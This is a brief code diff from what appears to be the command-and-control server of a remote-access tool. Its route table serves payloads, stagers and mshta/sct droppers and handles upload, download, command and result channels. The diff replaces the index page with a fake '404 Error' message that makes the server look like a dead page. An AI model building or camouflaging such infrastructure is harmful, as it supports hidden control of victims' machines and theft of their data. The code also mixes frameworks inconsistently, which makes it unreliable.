@@ -32,8 +32,9 @@ COUNT=0
 urls = ('/', 'index', raw_payload, 'payload', b52_payload, 'payloadc',b64_stager, 'stager',b52_stager, 'stager52', hjf_payload, 'payloadjf',b64_payload, 'base64', hjfs_payload, 'payloadjfs', sct_payload, 'sct', hta_payload, 'mshta', register_url+'/(.*)', 'info', download_url+'/(.*)', 'download', upload_url+'/(.*)', 'upload', image_url+'/(.*)', 'image', command_url+'/(.*)', 'command', result_url+'/(.*)', 'result', modules_url+'/(.*)', 'modules')
 
 @app.route("/", methods=["GET"])
-def index(request):
-    return "Hello, world. You're at the polls index."
+#def index(request):
+def index():
+    return "Oops... We Couldn't Find Your Page! (404 Error)"
 
 def toB52(st):
     value = 0
